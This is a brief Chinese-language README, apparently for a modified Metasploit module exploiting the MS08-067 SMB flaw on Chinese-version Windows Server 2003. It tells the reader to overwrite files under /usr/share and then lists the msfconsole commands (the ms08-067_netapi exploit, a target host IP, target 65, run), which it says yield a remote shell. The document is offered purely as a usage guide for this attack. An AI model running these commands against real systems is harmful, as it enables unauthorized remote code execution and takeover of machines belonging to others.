ms08-067_Server_2003_Chinese_Version

## 使用方法 ##
覆盖文件（在`/usr/share`下）
```
use exploit/windows/smb/ms08-067_netapi
set RHOST 192.168.1.11
set Target 65
run
```
即可得到shell
